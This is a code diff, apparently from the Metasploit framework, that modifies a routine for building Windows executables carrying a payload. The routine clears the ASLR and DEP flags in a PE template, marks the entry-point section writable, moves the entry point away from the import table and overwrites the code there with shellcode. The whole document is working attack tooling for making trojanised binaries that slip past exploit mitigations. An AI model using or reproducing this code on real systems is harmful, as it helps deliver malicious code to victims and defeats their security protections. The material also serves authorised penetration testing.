@@ -305,7 +305,7 @@ require 'msf/core/exe/segment_injector'
     end
 
     # Allow the user to specify their own EXE template
-    set_template_default(opts, "template_"+arch+"_windows.exe")
+    set_template_default(opts, "template_" + arch + "_windows.exe")
 
     pe = Rex::PeParsey::Pe.new_from_file(opts[:template], true)
 
@@ -314,26 +314,62 @@ require 'msf/core/exe/segment_injector'
         exe = fd.read(fd.stat.size)
       }
 
+    pe_header_size = 0x18
+    entryPoint_offset = 0x28
+    section_size = 0x28
+    characteristics_offset = 0x24
+    virtualAddress_offset = 0x0c
+    sizeOfRawData_offset = 0x10
+    dllCharacteristics_relative_offset = 0x46
+
+    #remove ASLR and permanent DEP
+    dllCharacteristics_offset = pe._dos_header.v['e_lfanew'] + pe_header_size + dllCharacteristics_relative_offset
+    new_DllCharacteristics = pe.hdr.opt.DllCharacteristics & 0xf000
+    exe[dllCharacteristics_offset,2] = [new_DllCharacteristics].pack('S')
+
+    sections_table_offset =
+      pe._dos_header.v['e_lfanew'] +
+      pe._file_header.v['SizeOfOptionalHeader'] +
+      pe_header_size
+
+    sections_table_characteristics_offset = sections_table_offset + characteristics_offset
+
     sections_header = []
-    pe._file_header.v['NumberOfSections'].times { |i| sections_header << [(i*0x28)+pe.rva_to_file_offset(pe._dos_header.v['e_lfanew']+pe._file_header.v['SizeOfOptionalHeader']+0x18+0x24),exe[(i*0x28)+pe.rva_to_file_offset(pe._dos_header.v['e_lfanew']+pe._file_header.v['SizeOfOptionalHeader']+0x18),0x28]] }
+    pe._file_header.v['NumberOfSections'].times { |i|
+      section_offset = sections_table_offset + (i * section_size)
+      sections_header << [
+        sections_table_characteristics_offset + (i * section_size),
+        exe[section_offset,section_size]
+      ]
+    }
 
+    addressOfEntryPoint = pe.hdr.opt.AddressOfEntryPoint
 
-    #look for section with entry point
+    # look for section with entry point
     sections_header.each do |sec|
-      virtualAddress = sec[1][0xc,0x4].unpack('L')[0]
-      sizeOfRawData = sec[1][0x10,0x4].unpack('L')[0]
-      characteristics = sec[1][0x24,0x4].unpack('L')[0]
-      if pe.hdr.opt.AddressOfEntryPoint >= virtualAddress && pe.hdr.opt.AddressOfEntryPoint < virtualAddress+sizeOfRawData
-        #put this section writable
-        characteristics|=0x80000000
+      virtualAddress = sec[1][virtualAddress_offset,0x4].unpack('L')[0]
+      sizeOfRawData = sec[1][sizeOfRawData_offset,0x4].unpack('L')[0]
+      characteristics = sec[1][characteristics_offset,0x4].unpack('L')[0]
+
+      if (virtualAddress...virtualAddress+sizeOfRawData).include?(addressOfEntryPoint)
+        importsTable = pe.hdr.opt.DataDirectory[8..(8+4)].unpack('L')[0]
+        if (importsTable - addressOfEntryPoint) < code.length
+          #shift original entry point to prevent tables overwritting
+          addressOfEntryPoint = importsTable - (code.length + 4)
+
+          entry_point_offset = pe._dos_header.v['e_lfanew'] + entryPoint_offset
+          exe[entry_point_offset,4] = [addressOfEntryPoint].pack('L')
+        end
+        # put this section writable
+        characteristics |= 0x8000_0000
         newcharacteristics = [characteristics].pack('L')
-        exe[sec[0],newcharacteristics.length]=newcharacteristics
+        exe[sec[0],newcharacteristics.length] = newcharacteristics
       end
     end
 
-    #put the shellcode at the entry point, overwriting template
-    exe[pe.rva_to_file_offset(pe.hdr.opt.AddressOfEntryPoint),code.length]=code
-
+    # put the shellcode at the entry point, overwriting template
+    entryPoint_file_offset = pe.rva_to_file_offset(addressOfEntryPoint)
+    exe[entryPoint_file_offset,code.length] = code
     return exe
   end
 
